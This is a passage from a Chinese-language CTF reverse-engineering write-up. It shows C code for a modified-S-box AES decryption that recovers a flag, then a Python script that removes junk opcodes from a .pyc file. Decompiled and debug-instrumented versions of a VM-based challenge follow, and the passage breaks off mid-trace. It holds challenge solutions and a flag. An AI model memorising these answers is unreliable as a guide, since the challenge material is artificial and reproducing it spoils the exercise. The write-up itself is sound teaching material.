    /* i: row, j: col */
    for (int i = 0; i < 4; ++i) {
        for (int j = 0; j < 4; ++j) {
            k[i][j] = (uint8_t) BYTE(key[j], 3 - i);  /* 把 uint32 key[4] 先转换为矩阵 uint8 k[4][4] */
            state[i][j] ^= k[i][j];
        }
    }

    return 0;
}

//字节替换
int subBytes(uint8_t (*state)[4]) {
    /* i: row, j: col */
    for (int i = 0; i < 4; ++i) {
        for (int j = 0; j < 4; ++j) {
            state[i][j] = S[state[i][j]]; //直接使用原始字节作为S盒数据下标
        }
    }

    return 0;
}

//逆字节替换
int invSubBytes(uint8_t (*state)[4]) {
    /* i: row, j: col */
    for (int i = 0; i < 4; ++i) {
        for (int j = 0; j < 4; ++j) {
            state[i][j] = inv_S[state[i][j]];
        }
    }
    return 0;
}

//行移位
int shiftRows(uint8_t (*state)[4]) {
    uint32_t block[4] = {0};

    /* i: row */
    for (int i = 0; i < 4; ++i) {
    //便于行循环移位，先把一行4字节拼成uint_32结构，移位后再转成独立的4个字节uint8_t
        LOAD32H(block[i], state[i]);
        block[i] = ROF32(block[i], 8*i);
        STORE32H(block[i], state[i]);
    }

    return 0;
}

//逆行移位
int invShiftRows(uint8_t (*state)[4]) {
    uint32_t block[4] = {0};

    /* i: row */
    for (int i = 0; i < 4; ++i) {
        LOAD32H(block[i], state[i]);
        block[i] = ROR32(block[i], 8*i);
        STORE32H(block[i], state[i]);
    }

    return 0;
}

/* Galois Field (256) Multiplication of two Bytes */
// 两字节的伽罗华域乘法运算
uint8_t GMul(uint8_t u, uint8_t v) {
    uint8_t p = 0;

    for (int i = 0; i < 8; ++i) {
        if (u & 0x01) {    //
            p ^= v;
        }

        int flag = (v & 0x80);
        v <<= 1;
        if (flag) {
            v ^= 0x1B; /* x^8 + x^4 + x^3 + x + 1 */
        }

        u >>= 1;
    }

    return p;
}

// 列混合
int mixColumns(uint8_t (*state)[4]) {
    uint8_t tmp[4][4];
    uint8_t M[4][4] = {{0x02, 0x03, 0x01, 0x01},
                       {0x01, 0x02, 0x03, 0x01},
                       {0x01, 0x01, 0x02, 0x03},
                       {0x03, 0x01, 0x01, 0x02}};

    /* copy state[4][4] to tmp[4][4] */
    for (int i = 0; i < 4; ++i) {
        for (int j = 0; j < 4; ++j){
            tmp[i][j] = state[i][j];
        }
    }

    for (int i = 0; i < 4; ++i) {
        for (int j = 0; j < 4; ++j) {  //伽罗华域加法和乘法
            state[i][j] = GMul(M[i][0], tmp[0][j]) ^ GMul(M[i][1], tmp[1][j])
                        ^ GMul(M[i][2], tmp[2][j]) ^ GMul(M[i][3], tmp[3][j]);
        }
    }

    return 0;
}

// 逆列混合
int invMixColumns(uint8_t (*state)[4]) {
    uint8_t tmp[4][4];
    uint8_t M[4][4] = {{0x0E, 0x0B, 0x0D, 0x09},
                       {0x09, 0x0E, 0x0B, 0x0D},
                       {0x0D, 0x09, 0x0E, 0x0B},
                       {0x0B, 0x0D, 0x09, 0x0E}};  //使用列混合矩阵的逆矩阵

    /* copy state[4][4] to tmp[4][4] */
    for (int i = 0; i < 4; ++i) {
        for (int j = 0; j < 4; ++j){
            tmp[i][j] = state[i][j];
        }
    }

    for (int i = 0; i < 4; ++i) {
        for (int j = 0; j < 4; ++j) {
            state[i][j] = GMul(M[i][0], tmp[0][j]) ^ GMul(M[i][1], tmp[1][j])
                          ^ GMul(M[i][2], tmp[2][j]) ^ GMul(M[i][3], tmp[3][j]);
        }
    }

    return 0;
}

// AES-128加密接口，输入key应为16字节长度，输入长度应该是16字节整倍数，
// 这样输出长度与输入长度相同，函数调用外部为输出数据分配内存
int aesEncrypt(const uint8_t *key, uint32_t keyLen, const uint8_t *pt, uint8_t *ct, uint32_t len) {

    AesKey aesKey;
    uint8_t *pos = ct;
    const uint32_t *rk = aesKey.eK;  //解密秘钥指针
    uint8_t out[BLOCKSIZE] = {0};
    uint8_t actualKey[16] = {0};
    uint8_t state[4][4] = {0};

    if (NULL == key || NULL == pt || NULL == ct){
        printf("param err.\n");
        return -1;
    }

    if (keyLen > 16){
        printf("keyLen must be 16.\n");
        return -1;
    }

    if (len % BLOCKSIZE){
        printf("inLen is invalid.\n");
        return -1;
    }

    memcpy(actualKey, key, keyLen);
    keyExpansion(actualKey, 16, &aesKey);  // 秘钥扩展

        // 使用ECB模式循环加密多个分组长度的数据
    for (int i = 0; i < len; i += BLOCKSIZE) {
                // 把16字节的明文转换为4x4状态矩阵来进行处理
        loadStateArray(state, pt);
        // 轮秘钥加
        addRoundKey(state, rk);

        for (int j = 1; j < 10; ++j) {
            rk += 4;
            subBytes(state);   // 字节替换
            shiftRows(state);  // 行移位
            mixColumns(state); // 列混合
            addRoundKey(state, rk); // 轮秘钥加
        }

        subBytes(state);    // 字节替换
        shiftRows(state);  // 行移位
        // 此处不进行列混合
        addRoundKey(state, rk+4); // 轮秘钥加
                
                // 把4x4状态矩阵转换为uint8_t一维数组输出保存
        storeStateArray(state, pos);

        pos += BLOCKSIZE;  // 加密数据内存指针移动到下一个分组
        pt += BLOCKSIZE;   // 明文数据指针移动到下一个分组
        rk = aesKey.eK;    // 恢复rk指针到秘钥初始位置
    }
    return 0;
}

// AES128解密， 参数要求同加密
int aesDecrypt(const uint8_t *key, uint32_t keyLen, const uint8_t *ct, uint8_t *pt, uint32_t len) {
    AesKey aesKey;
    uint8_t *pos = pt;
    const uint32_t *rk = aesKey.dK;  //解密秘钥指针
    uint8_t out[BLOCKSIZE] = {0};
    uint8_t actualKey[16] = {0};
    uint8_t state[4][4] = {0};

    if (NULL == key || NULL == ct || NULL == pt){
        printf("param err.\n");
        return -1;
    }

    if (keyLen > 16){
        printf("keyLen must be 16.\n");
        return -1;
    }

    if (len % BLOCKSIZE){
        printf("inLen is invalid.\n");
        return -1;
    }

    memcpy(actualKey, key, keyLen);
    keyExpansion(actualKey, 16, &aesKey);  //秘钥扩展，同加密

    for (int i = 0; i < len; i += BLOCKSIZE) {
        // 把16字节的密文转换为4x4状态矩阵来进行处理
        loadStateArray(state, ct);
        // 轮秘钥加，同加密
        addRoundKey(state, rk);

        for (int j = 1; j < 10; ++j) {
            rk += 4;
            invShiftRows(state);    // 逆行移位
            invSubBytes(state);     // 逆字节替换，这两步顺序可以颠倒
            addRoundKey(state, rk); // 轮秘钥加，同加密
            invMixColumns(state);   // 逆列混合
        }

        invSubBytes(state);   // 逆字节替换
        invShiftRows(state);  // 逆行移位
        // 此处没有逆列混合
        addRoundKey(state, rk+4);  // 轮秘钥加，同加密

        storeStateArray(state, pos);  // 保存明文数据
        pos += BLOCKSIZE;  // 输出数据内存指针移位分组长度
        ct += BLOCKSIZE;   // 输入数据内存指针移位分组长度
        rk = aesKey.dK;    // 恢复rk指针到秘钥初始位置
    }
    return 0;
}

// 方便输出16进制数据
void printHex(uint8_t *ptr, int len, char *tag) {
    printf("%s\ndata[%d]: ", tag, len);
    for (int i = 0; i < len; ++i) {
        printf("%.2X ", *ptr++);
    }
    printf("\n");
}

int main() {
    //S盒有变化,需要求出逆S盒
    //unsigned char change_S[256] = {41,64,87,110,133,156,179,202,225,248,15,38,61,84,107,130,153,176,199,222,245,12,35,58,81,104,127,150,173,196,219,242,9,32,55,78,101,124,147,170,193,216,239,6,29,52,75,98,121,144,167,190,213,236,3,26,49,72,95,118,141,164,187,210,233,0,23,46,69,92,115,138,161,184,207,230,253,20,43,66,89,112,135,158,181,204,227,250,17,40,63,86,109,132,155,178,201,224,247,14,37,60,83,106,129,152,175,198,221,244,11,34,57,80,103,126,149,172,195,218,241,8,31,54,77,100,123,146,169,192,215,238,5,28,51,74,97,120,143,166,189,212,235,2,25,48,71,94,117,140,163,186,209,232,255,22,45,68,91,114,137,160,183,206,229,252,19,42,65,88,111,134,157,180,203,226,249,16,39,62,85,108,131,154,177,200,223,246,13,36,59,82,105,128,151,174,197,220,243,10,33,56,79,102,125,148,171,194,217,240,7,30,53,76,99,122,145,168,191,214,237,4,27,50,73,96,119,142,165,188,211,234,1,24,47,70,93,116,139,162,185,208,231,254,21,44,67,90,113,136,159,182,205,228,251,18};
    uint8_t line=0,rol=0;            //位置
    for(int i=0;i<256;i++){
        line = (S[i]&0xf0)>>4;
        rol = S[i]&0xf;
        inv_S[line*16+rol] = i;
    }

    
    const uint8_t key[16] = {0x52, 0x65, 0x5f, 0x31, 0x73, 0x5f, 0x65, 0x61, 0x53, 0x79, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36};
    const uint8_t pt[16]={0x32, 0x43, 0xf6, 0xa8, 0x88, 0x5a, 0x30, 0x8d, 0x31, 0x31, 0x98, 0xa2, 0xe0, 0x37, 0x07, 0x34};
    uint8_t ct[16] = {0x2b, 0xc8, 0x20, 0x8b, 0x5c, 0xd, 0xa7, 0x9b, 0x2a, 0x51, 0x3a, 0xd2, 0x71, 0x71, 0xca, 0x50};     // 外部申请输出数据内存，用于加密后的数据
    uint8_t plain[16] = {0};  // 外部申请输出数据内存，用于解密后的数据
    //aesEncrypt(key, 16, pt, ct, 16); // 加密
    //printHex(pt, 16, "plain data:"); // 打印初始明文数据
    //printHex(ct, 16, "after encryption:");  // 打印加密后的密文


    aesDecrypt(key, 16, ct, plain, 16);       // 解密
    printHex(plain, 16, "after decryption:"); // 打印解密后的明文数据
    //_eZ_Rc4_@nd_AES!
    return 0;
}
```

### RightBack

看一下字节码

```python
import marshal, dis
f = open("RightBack.pyc", "rb").read()

code = marshal.loads(f[16:])                        #这边从 16 位开始取因为是 python3 python2 从 8 位开始取

dis.dis(code)
```

然而却失败了,看了看最后几行,应该是有花指令

![](static/QWs5bWfx5o1D7cxLMpUcE2u2nSc.png)

去一下花指令

```python
import marshal, dis

f = open("RightBack.pyc", "rb").read()
f = bytearray(f)
# 6E 00 6E 04 A3 A7 39 B7
i = 0
jump_list = [0x00, 0x02, 0x04]
while i < len(f):
    if f[i] == 0x6e and f[i + 1] == 0x00 and f[i + 2] == 0x6e and f[i + 3] == 0x04 and f[i + 8] == 0x6e and f[
        i + 9] == 2:
        for j in range(12):
            f[i + j] = 0x09
    i += 1
code = marshal.loads(bytes(f[16:]))
dis.dis(code)
with open("RightBack_patch.pyc",'wb') as ff:
    ff.write(bytes(f))
```

用在线网站反编译一下

```python
#!/usr/bin/env python
# visit https://tool.lu/pyc/ for more information
# Version: Python 3.9

import struct


def T(num, round):
    numArr = bytearray(struct.pack('<I', num))
    for i in range(4):
        numArr[i] = Sbox[numArr[i]]
    return struct.unpack('<I', numArr)[0] ^ Rcon[round]


def p1(s, key):
    j = 0
    k = []
    for i in range(256):
        s.append(i)
        k.append(key[i % len(key)])
    for i in range(256):
        j = (j + s[i] + ord(k[i])) % 256
        s[i] = s[j]
        s[j] = s[i]


def p2(key):
    w = [
            0] * 44
    for i in range(4):
        w[i] = struct.unpack('<I', key[i * 4:i * 4 + 4])[0]
    cnt = 0
    for i in range(4, 44, 1):
        if i % 4 == 0:
            w[i] = w[i - 4] ^ T(w[i - 1], cnt)
            cnt += 1
        w[i] = w[i - 4] ^ w[i - 1]
    return w


def p3(s, p):
    i = j = 0
    for z in range(len(p)):
        i = (i + 1) % 256
        j = (j + s[i]) % 256
        s[i] = s[j]
        s[j] = s[i]
        p[z] ^= s[(s[i] + s[j]) % 256]
    return p


def F1(part1, part2):
    global REG
    REG = {
        'EAX': 0,
        'EBX': 0,
        'ECX': 0,
        'EDX': 0,
        'R8': 0,
        'CNT': 0,
        'EIP': 0}
    REG['EAX'] = part1
    REG['EBX'] = part2


def F2(v1, v2, v3):
    if v1 == 1:
        REG[reg_table[str(v2)]] = extendKey[REG[reg_table[str(v3)]]]
    elif v1 == 2:
        REG[reg_table[str(v2)]] = REG[reg_table[str(v3)]]
    elif v1 == 3:
        REG[reg_table[str(v2)]] = v3
    REG['EIP'] += 4


def F3(v1, v2, v3):
    if v1 == 1:
        REG[reg_table[str(v2)]] = REG[reg_table[str(v2)]] + extendKey[REG[reg_table[str(v3)]]] & 0xFFFFFFFF
    elif v1 == 2:
        REG[reg_table[str(v2)]] = REG[reg_table[str(v2)]] + REG[reg_table[str(v3)]] & 0xFFFFFFFF
    elif v1 == 3:
        REG[reg_table[str(v2)]] = REG[reg_table[str(v2)]] + v3 & 0xFFFFFFFF
    REG['EIP'] += 4


def F4(v1, v2):
    REG[reg_table[str(v1)]] ^= REG[reg_table[str(v2)]]
    REG['EIP'] += 3


def F5(v1, v2):
    REG[reg_table[str(v1)]] &= v2
    REG['EIP'] += 3


def F6(v1, v2, v3):
    if v1 == 1:
        REG[reg_table[str(v2)]] -= extendKey[v3]
    elif v1 == 2:
        REG[reg_table[str(v2)]] -= REG[reg_table[str(v3)]]
    elif v1 == 3:
        REG[reg_table[str(v2)]] -= v3
    REG['EIP'] += 4


def F7(v1, v2):
    REG[reg_table[str(v1)]] |= REG[reg_table[str(v2)]]
    REG['EIP'] += 3


def F8(v1, v2):
    REG[reg_table[str(v1)]] = REG[reg_table[str(v1)]] >> REG[reg_table[str(v2)]] & 0xFFFFFFFF
    REG['EIP'] += 3


def F9(v1, v2):
    REG[reg_table[str(v1)]] = REG[reg_table[str(v1)]] << REG[reg_table[str(v2)]] & 0xFFFFFFFF
    REG['EIP'] += 3


def FA(v1, v2, v3):
    if v1 == 1:
        REG[reg_table[str(v2)]] *= extendKey[v3]
    elif v1 == 2:
        REG[reg_table[str(v2)]] *= REG[reg_table[str(v3)]]
    elif v1 == 3:
        REG[reg_table[str(v2)]] *= v3
    REG['EIP'] += 4


def FB():
    REG['R8'] = REG['CNT'] == 21
    REG['EIP'] += 1


def WC():
    if not REG['R8']:
        REG['EIP'] = 16
    else:
        REG['EIP'] += 1


def VM(part1, part2):
    F1(part1, part2)
    EIP = REG['EIP']
    if opcode[EIP] == 80:
        F2(opcode[EIP + 1], opcode[EIP + 2], opcode[EIP + 3])
    if opcode[EIP] == 29:
        F3(opcode[EIP + 1], opcode[EIP + 2], opcode[EIP + 3])
    if opcode[EIP] == 113:
        F4(opcode[EIP + 1], opcode[EIP + 2])
    if opcode[EIP] == 114:
        F5(opcode[EIP + 1], opcode[EIP + 2])
    if opcode[EIP] == 150:
        F6(opcode[EIP + 1], opcode[EIP + 2], opcode[EIP + 3])
    if opcode[EIP] == 87:
        F7(opcode[EIP + 1], opcode[EIP + 2])
    if opcode[EIP] == 116:
        F8(opcode[EIP + 1], opcode[EIP + 2])
    if opcode[EIP] == 41:
        F9(opcode[EIP + 1], opcode[EIP + 2])
    if opcode[EIP] == 220:
        FA(opcode[EIP + 1], opcode[EIP + 2], opcode[EIP + 3])
    if opcode[EIP] == 7:
        FB()
    if opcode[EIP] == 153:
        WC()


def Have():
    Hello = '                                                                                                                                                                                                                                                \n||   / |  / /                                                                     \n||  /  | / /  ___     //  ___      ___      _   __      ___       __  ___  ___    \n|| / /||/ / //___) ) // //   ) ) //   ) ) // ) )  ) ) //___) )     / /   //   ) ) \n||/ / |  / //       // //       //   / / // / /  / / //           / /   //   / /  \n|  /  | / ((____   // ((____   ((___/ / // / /  / / ((____       / /   ((___/ /   \n                                                                                            \n                                                                                            \n||   / |  / / /|    //| |     //   ) ) /__  ___/ //   / / ___      ___      ___      ___    \n||  /  | / / //|   // | |    //          / /    //___   //   ) ) //   ) ) //   ) ) //   ) ) \n|| / /||/ / // |  //  | |   //          / /    / ___     ___/ / //   / /   ___/ /   __ / /  \n||/ / |  / //  | //   | |  //          / /    //       / ____/ //   / /  / ____/       ) )  \n|  /  | / //   |//    | | ((____/ /   / /    //       / /____ ((___/ /  / /____  ((___/ /     \n    '
    print(Hello)
    return input('RightBack: ').encode()


def Fun(right):
    if len(right) != 64:
        print('XD')
        exit()
    back = b''
    for i in range(0, len(right), 8):
        part1 = struct.unpack('>I', right[i + 0:i + 4])[0]
        part2 = struct.unpack('>I', right[i + 4:i + 8])[0]
        if i != 0:
            part1 ^= struct.unpack('>I', back[i - 8:i - 4])[0]
            part2 ^= struct.unpack('>I', back[i - 4:i])[0]
        VM(part1, part2)
        back += struct.pack('>I', REG['EAX'])
        back += struct.pack('>I', REG['EBX'])
    return back


if __name__ == '__main__':
    REG = {}
    EIP = 0
    reg_table = {
        '1': 'EAX',
        '2': 'EBX',
        '3': 'ECX',
        '4': 'EDX',
        '5': 'R8',
        '6': 'CNT',
        '7': 'EIP'}
    Sbox = [82,9,106,213,48,54,165,56,191,64,163,158,129,243,215,251,124,227,57,130,155,47,255,135,52,142,67,68,196,222,233,203,84,123,148,50,166,194,35,61,238,76,149,11,66,250,195,78,8,46,161,102,40,217,36,178,118,91,162,73,109,139,209,37,114,248,246,100,134,104,152,22,212,164,92,204,93,101,182,146,108,112,72,80,253,237,185,218,94,21,70,87,167,141,157,132,144,216,171,0,140,188,211,10,247,228,88,5,184,179,69,6,208,44,30,143,202,63,15,2,193,175,189,3,1,19,138,107,58,145,17,65,79,103,220,234,151,242,207,206,240,180,230,115,150,172,116,34,231,173,53,133,226,249,55,232,28,117,223,110,71,241,26,113,29,41,197,137,111,183,98,14,170,24,190,27,252,86,62,75,198,210,121,32,154,219,192,254,120,205,90,244,31,221,168,51,136,7,199,49,177,18,16,89,39,128,236,95,96,81,127,169,25,181,74,13,45,229,122,159,147,201,156,239,160,224,59,77,174,42,245,176,200,235,187,60,131,83,153,97,23,43,4,126,186,119,214,38,225,105,20,99,85,33,12,125]
    Rcon = [16777216,33554432,67108864,134217728,268435456,536870912,1073741824,0x80000000,452984832,905969664]
    s = []
    key = 'CalmDownBelieveU'
    p1(s, key)
    key = [61,15,58,65,177,180,182,248,192,143,37,238,50,29,215,190]
    key = bytes(p3(s, key))
    extendKey = p2(bytes(key))
    opcode = [69,136,121,24,179,67,209,20,27,169,205,146,212,160,124,49,20,155,157,253,52,71,174,164,134,60,184,203,131,210,57,151,77,241,61,6,13,52,235,37,100,178,8,238,205,27,194,159,230,165,211,221,100,217,111,202,185,207,226,50,88,4,58,73,10,92,24,230,246,245,21,110,182,151,85,28,181,191,185,236,92,98,222,85,228,14,235,93,77,161,61,140,222,74,124,13,211,75,134,235,164,228,235,16,29,41,49,105,188,51,232,65,209,165,35,182,248,245,69,18,152,71,223,85,114]
    opcode = p3(s, opcode)
    right = Have()
    back = Fun(right)
    data1 = [228,244,207,251,194,124,252,61,198,145,97,98,89,25,92,208,155,38,34,225,98,206,234,245,223,54,214,137,35,86,180,66,223,234,90,136,5,189,166,117,111,222,39,156,163,173,36,174,47,144,15,160,45,239,211,11,190,181,24,164,234,114,174,27]
    data1 = bytes(p3(s, data1))
    data2 = [165,83,203,51,99,164,30,91,230,64,181,55,190,47,125,240,186,173,116,47,89,64,68,215,124,138,34,175,60,136,77,216,250,127,14,14,66,168,198,247,252,189,243,239,25,63,143,7,177,13,99,226,100,6,207,77,46,136,251,123,225,27,76,183]
    data2 = bytes(p3(s, data2))
    data3 = [95,219,46,178,111,141,17,168,254,60,68,59,41,183,182,118,3,47,150,240,140,159,110,238]
    data3 = bytes(p3(s, data3))
    if back == data2:
        print(bytes(data1).decode())
    else:
        print(bytes(data3).decode())
```

在代码中写一下 debug 跑一下

```python
#!/usr/bin/env python
# visit https://tool.lu/pyc/ for more information
# Version: Python 3.9

import struct


def T(num, round):
    numArr = bytearray(struct.pack('<I', num))
    for i in range(4):
        numArr[i] = Sbox[numArr[i]]
    return struct.unpack('<I', numArr)[0] ^ Rcon[round]


def p1(s, key):
    j = 0
    k = []
    for i in range(256):
        s.append(i)
        k.append(key[i % len(key)])
    for i in range(256):
        j = (j + s[i] + ord(k[i])) % 256
        #用在线网站,交换有问题
        #s[i] = s[j]
        #s[j] = s[i]
        s[i],s[j]=s[j],s[i]


def p2(key):
    w = [0] * 44
    for i in range(4):
        w[i] = struct.unpack('<I', key[i * 4:i * 4 + 4])[0]
    cnt = 0
    for i in range(4, 44, 1):
        if i % 4 == 0:
            w[i] = w[i - 4] ^ T(w[i - 1], cnt)
            cnt += 1
        w[i] = w[i - 4] ^ w[i - 1]
    return w


def p3(s, p):
    i = j = 0
    for z in range(len(p)):
        i = (i + 1) % 256
        j = (j + s[i]) % 256
        #s[i] = s[j]
        #s[j] = s[i]
        s[i], s[j] = s[j], s[i]
        p[z] ^= s[(s[i] + s[j]) % 256]
    return p


def F1(part1, part2):
    global REG
    REG = {
        'EAX': 0,
        'EBX': 0,
        'ECX': 0,
        'EDX': 0,
        'R8': 0,
        'CNT': 0,
        'EIP': 0}
    REG['EAX'] = part1
    print(f"MOV EAX {hex(part1)}")
    REG['EBX'] = part2
    print(f"MOV EBX {hex(part2)}")


def F2(v1, v2, v3):
    if v1 == 1:
        REG[reg_table[str(v2)]] = extendKey[REG[reg_table[str(v3)]]]
        print(f"MOV {reg_table[str(v2)]}, extendKey[{REG[reg_table[str(v3)]]}]")
    elif v1 == 2:
        REG[reg_table[str(v2)]] = REG[reg_table[str(v3)]]
        print(f"MOV {reg_table[str(v2)]}, {reg_table[str(v3)]}")
    elif v1 == 3:
        REG[reg_table[str(v2)]] = v3
        print(f"MOV {reg_table[str(v2)]}, {v3}")
    REG['EIP'] += 4


def F3(v1, v2, v3):
    if v1 == 1:
        REG[reg_table[str(v2)]] = REG[reg_table[str(v2)]] + extendKey[REG[reg_table[str(v3)]]] & 0xFFFFFFFF
        print(f"ADD {reg_table[str(v2)]}, extendKey[{REG[reg_table[str(v3)]]}]")
    elif v1 == 2:
        REG[reg_table[str(v2)]] = REG[reg_table[str(v2)]] + REG[reg_table[str(v3)]] & 0xFFFFFFFF
        print(f"ADD {reg_table[str(v2)]}, {reg_table[str(v3)]}")
    elif v1 == 3:
        REG[reg_table[str(v2)]] = REG[reg_table[str(v2)]] + v3 & 0xFFFFFFFF
        print(f"ADD {reg_table[str(v2)]} {hex(v3 & 0xFFFFFFFF)}")
    REG['EIP'] += 4


def F4(v1, v2):
    REG[reg_table[str(v1)]] ^= REG[reg_table[str(v2)]]
    print(f"XOR {reg_table[str(v1)]}, {reg_table[str(v2)]}")
    REG['EIP'] += 3


def F5(v1, v2):
    REG[reg_table[str(v1)]] &= v2
    print(f"AND {reg_table[str(v1)]}, {hex(v2)}")
    REG['EIP'] += 3


def F6(v1, v2, v3):
    if v1 == 1:
        REG[reg_table[str(v2)]] -= extendKey[v3]
        print(f"SUB {reg_table[str(v2)]}, extendKey[{v3}]")
    elif v1 == 2:
        REG[reg_table[str(v2)]] -= REG[reg_table[str(v3)]]
        print(f"SUB {reg_table[str(v2)]}, {reg_table[str(v3)]}")
    elif v1 == 3:
        REG[reg_table[str(v2)]] -= v3
        print(f"SUB {reg_table[str(v2)]}, {hex(v3)}")
    REG['EIP'] += 4


def F7(v1, v2):
    REG[reg_table[str(v1)]] |= REG[reg_table[str(v2)]]
    print(f"OR {reg_table[str(v1)]}, {reg_table[str(v2)]}")
    REG['EIP'] += 3


def F8(v1, v2):
    REG[reg_table[str(v1)]] = REG[reg_table[str(v1)]] >> REG[reg_table[str(v2)]] & 0xFFFFFFFF
    print(f"SAR {reg_table[str(v1)]}, {reg_table[str(v2)]}")
    REG['EIP'] += 3


def F9(v1, v2):
    REG[reg_table[str(v1)]] = REG[reg_table[str(v1)]] << REG[reg_table[str(v2)]] & 0xFFFFFFFF
    print(f"SAL {reg_table[str(v1)]}, {reg_table[str(v2)]}")
    REG['EIP'] += 3


def FA(v1, v2, v3):
    if v1 == 1:
        REG[reg_table[str(v2)]] *= extendKey[v3]
        print(f"MUL {reg_table[str(v2)]}, extendKey[{v3}]")
    elif v1 == 2:
        REG[reg_table[str(v2)]] *= REG[reg_table[str(v3)]]
        print(f"MUL {reg_table[str(v2)]}, {reg_table[str(v3)]}")
    elif v1 == 3:
        REG[reg_table[str(v2)]] *= v3
        print(f"MUL {reg_table[str(v2)]}, {hex(v3)}")
    REG['EIP'] += 4


def FB():
    REG['R8'] = (REG['CNT'] == 21)
    print(f"MOV R8, (CNT==21)")
    REG['EIP'] += 1


def WC():
    if not REG['R8']:
        print(f"MOV EIP, 16")
        REG['EIP'] = 16
    else:
        REG['EIP'] += 1


def VM(part1, part2):
    F1(part1, part2)
    EIP = REG['EIP']
    while EIP !=124:#while循环是我手动添加的,不然运行不了
        EIP = REG['EIP']
        print(f"{str(EIP).zfill(3)}##  ",end='')
        if opcode[EIP] == 80:
            F2(opcode[EIP + 1], opcode[EIP + 2], opcode[EIP + 3])
        if opcode[EIP] == 29:
            F3(opcode[EIP + 1], opcode[EIP + 2], opcode[EIP + 3])
        if opcode[EIP] == 113:
            F4(opcode[EIP + 1], opcode[EIP + 2])
        if opcode[EIP] == 114:
            F5(opcode[EIP + 1], opcode[EIP + 2])
        if opcode[EIP] == 150:
            F6(opcode[EIP + 1], opcode[EIP + 2], opcode[EIP + 3])
        if opcode[EIP] == 87:
            F7(opcode[EIP + 1], opcode[EIP + 2])
        if opcode[EIP] == 116:
            F8(opcode[EIP + 1], opcode[EIP + 2])
        if opcode[EIP] == 41:
            F9(opcode[EIP + 1], opcode[EIP + 2])
        if opcode[EIP] == 220:
            FA(opcode[EIP + 1], opcode[EIP + 2], opcode[EIP + 3])
        if opcode[EIP] == 7:
            FB()
        if opcode[EIP] == 153:
            WC()


def Have():
    Hello = '                                                                                                                                                                                                                                                \n||   / |  / /                                                                     \n||  /  | / /  ___     //  ___      ___      _   __      ___       __  ___  ___    \n|| / /||/ / //___) ) // //   ) ) //   ) ) // ) )  ) ) //___) )     / /   //   ) ) \n||/ / |  / //       // //       //   / / // / /  / / //           / /   //   / /  \n|  /  | / ((____   // ((____   ((___/ / // / /  / / ((____       / /   ((___/ /   \n                                                                                            \n                                                                                            \n||   / |  / / /|    //| |     //   ) ) /__  ___/ //   / / ___      ___      ___      ___    \n||  /  | / / //|   // | |    //          / /    //___   //   ) ) //   ) ) //   ) ) //   ) ) \n|| / /||/ / // |  //  | |   //          / /    / ___     ___/ / //   / /   ___/ /   __ / /  \n||/ / |  / //  | //   | |  //          / /    //       / ____/ //   / /  / ____/       ) )  \n|  /  | / //   |//    | | ((____/ /   / /    //       / /____ ((___/ /  / /____  ((___/ /     \n    '
    #print(Hello)
    return input('RightBack: ').encode()


def Fun(right):
    if len(right) != 64:
        print('XD')
        exit()
    back = b''
    for i in range(0, len(right), 8):
        print(f"\nROUND {i//8+1}")
        part1 = struct.unpack('>I', right[i + 0:i + 4])[0]
        part2 = struct.unpack('>I', right[i + 4:i + 8])[0]
        if i != 0:
            part1 ^= struct.unpack('>I', back[i - 8:i - 4])[0]
            part2 ^= struct.unpack('>I', back[i - 4:i])[0]
        VM(part1, part2)
        back += struct.pack('>I', REG['EAX'])
        back += struct.pack('>I', REG['EBX'])
    return back

#1234567812345678123456781234567812345678123456781234567812345678
if __name__ == '__main__':
    REG = {}
    EIP = 0
    reg_table = {
        '1': 'EAX',
        '2': 'EBX',
        '3': 'ECX',
        '4': 'EDX',
        '5': 'R8',
        '6': 'CNT',
        '7': 'EIP'}
    Sbox = [82,9,106,213,48,54,165,56,191,64,163,158,129,243,215,251,124,227,57,130,155,47,255,135,52,142,67,68,196,222,233,203,84,123,148,50,166,194,35,61,238,76,149,11,66,250,195,78,8,46,161,102,40,217,36,178,118,91,162,73,109,139,209,37,114,248,246,100,134,104,152,22,212,164,92,204,93,101,182,146,108,112,72,80,253,237,185,218,94,21,70,87,167,141,157,132,144,216,171,0,140,188,211,10,247,228,88,5,184,179,69,6,208,44,30,143,202,63,15,2,193,175,189,3,1,19,138,107,58,145,17,65,79,103,220,234,151,242,207,206,240,180,230,115,150,172,116,34,231,173,53,133,226,249,55,232,28,117,223,110,71,241,26,113,29,41,197,137,111,183,98,14,170,24,190,27,252,86,62,75,198,210,121,32,154,219,192,254,120,205,90,244,31,221,168,51,136,7,199,49,177,18,16,89,39,128,236,95,96,81,127,169,25,181,74,13,45,229,122,159,147,201,156,239,160,224,59,77,174,42,245,176,200,235,187,60,131,83,153,97,23,43,4,126,186,119,214,38,225,105,20,99,85,33,12,125]
    Rcon = [16777216,33554432,67108864,134217728,268435456,536870912,1073741824,0x80000000,452984832,905969664]
    s = []
    key = 'CalmDownBelieveU'
    p1(s, key)
    key = [61,15,58,65,177,180,182,248,192,143,37,238,50,29,215,190]
    key = bytes(p3(s, key))
    extendKey = p2(bytes(key))
    opcode = [69,136,121,24,179,67,209,20,27,169,205,146,212,160,124,49,20,155,157,253,52,71,174,164,134,60,184,203,131,210,57,151,77,241,61,6,13,52,235,37,100,178,8,238,205,27,194,159,230,165,211,221,100,217,111,202,185,207,226,50,88,4,58,73,10,92,24,230,246,245,21,110,182,151,85,28,181,191,185,236,92,98,222,85,228,14,235,93,77,161,61,140,222,74,124,13,211,75,134,235,164,228,235,16,29,41,49,105,188,51,232,65,209,165,35,182,248,245,69,18,152,71,223,85,114]
    opcode = p3(s, opcode)
    right = Have()
    back = Fun(right)
    data1 = [228,244,207,251,194,124,252,61,198,145,97,98,89,25,92,208,155,38,34,225,98,206,234,245,223,54,214,137,35,86,180,66,223,234,90,136,5,189,166,117,111,222,39,156,163,173,36,174,47,144,15,160,45,239,211,11,190,181,24,164,234,114,174,27]
    data1 = bytes(p3(s, data1))
    data2 = [165,83,203,51,99,164,30,91,230,64,181,55,190,47,125,240,186,173,116,47,89,64,68,215,124,138,34,175,60,136,77,216,250,127,14,14,66,168,198,247,252,189,243,239,25,63,143,7,177,13,99,226,100,6,207,77,46,136,251,123,225,27,76,183]
    data2 = bytes(p3(s, data2))
    data3 = [95,219,46,178,111,141,17,168,254,60,68,59,41,183,182,118,3,47,150,240,140,159,110,238]
    data3 = bytes(p3(s, data3))
    final = struct.unpack('>16I',data2)
    from ctypes import *

    print(final)


    if back == data2:
        print(bytes(data1).decode())
    else:
        print(bytes(data3).decode())
```

VM 函数一轮加密的输出如下

```python
ROUND 1
MOV EAX 0x31323334
MOV EBX 0x35363738
